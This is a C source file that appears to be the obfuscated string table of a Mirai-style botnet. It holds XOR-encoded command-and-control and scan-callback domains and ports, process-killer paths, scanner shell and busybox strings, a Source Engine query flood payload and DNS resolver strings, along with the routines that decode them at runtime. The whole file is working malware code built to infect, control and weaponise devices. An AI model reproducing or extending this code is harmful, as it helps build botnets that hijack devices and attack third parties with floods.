#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_keys[] = {0x5a379362, 0x4f08cb76, 0x35c5646f, 0x134af387, 0x5f21e986, 0x5799d57f, 0x1d63515b, 0x23d6d77e, 0x191f576d, 0x2cc513bb, 0x7375f0e9, 0x399d94af, 0x2f1e9237, 0x56468c33, 0x53878531, 0x3dbb1410, 0x39edc189, 0x332cd761, 0x1ef0c0e8, 0x34ce7f8e,};
struct table_value table[TABLE_MAX_KEYS];

void table_init(void) {

    /* cnc connection */
    add_entry(TABLE_CNC_DOMAIN, "\xF9\xE6\xEF\xAD\xE1\xEA\xEC\x83", 8);
    add_entry(TABLE_CNC_PORT, "\x0\x2\x2\x6", 4);

    /* scan connection */
    add_entry(TABLE_SCAN_CB_DOMAIN, "\xF9\xE6\xEF\xAD\xE1\xEA\xEC\x83", 8);
    add_entry(TABLE_SCAN_CB_PORT, "\x5\x9\x0\x1\x0", 5);

    /* misc */
    add_entry(TABLE_EXEC_SUCCESS, "\x56\x5e\x55\x11\x46\x58\x5d\x5d\x11\x42\x50\x47\x54\x11\x44\x42\x11\x50\x5d\x5d", 20);
    add_entry(TABLE_ATK_VSE, "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", 25);
    add_entry(TABLE_BOT_KEY, "\x5c\x54\x5e\x46", 4);

    /* killer */
    add_entry(TABLE_KILLER_PROC, "\x1e\x41\x43\x5e\x52\x1e", 6);
    add_entry(TABLE_KILLER_EXE, "\x1e\x54\x49\x54", 4);
    add_entry(TABLE_KILLER_FD, "\x1e\x57\x55", 3);
    add_entry(TABLE_KILLER_CMDLINE, "\x1e\x52\x5c\x55\x5d\x58\x5f\x54", 8);

    /* scanner */
    add_entry(TABLE_SCAN_ENABLE, "\x54\x5f\x50\x53\x5d\x54", 6);
    add_entry(TABLE_SCAN_SYSTEM, "\x49\x43\x49\x4e\x5f\x57", 6);
    add_entry(TABLE_SCAN_SHELL, "\x42\x59\x54\x5d\x5d", 5);
    add_entry(TABLE_SCAN_SH, "\x42\x59", 2);
    add_entry(TABLE_SCAN_QUERY, "\x1e\x53\x58\x5f\x1e\x53\x44\x42\x48\x53\x5e\x49\x11\x7c\x78\x63\x70\x78", 18);
    add_entry(TABLE_SCAN_NCORRECT, "\x5f\x52\x5e\x43\x43\x54\x52\x45", 8);
    add_entry(TABLE_SCAN_RESP, "\x7c\x78\x63\x70\x78\xb\x11\x50\x41\x41\x5d\x54\x45\x11\x5f\x5e\x45\x11\x57\x5e\x44\x5f\x55", 23);

    /* attack */
    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);
}

void table_unlock_val(uint8_t id) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked) {
        printf("[table/lock]: tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked) {
        printf("[table/lock]: tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked) {
        printf("[table/get]: tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len) {
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id) {
    struct table_value *val = &table[id];

    for (int i = 0; i < TABLE_KEY_LEN; i++) {

        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;

        for (int i = 0; i < val->val_len; i++) {
            val->val[i] ^= k1;
            val->val[i] ^= k2;
            val->val[i] ^= k3;
            val->val[i] ^= k4;
        }
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
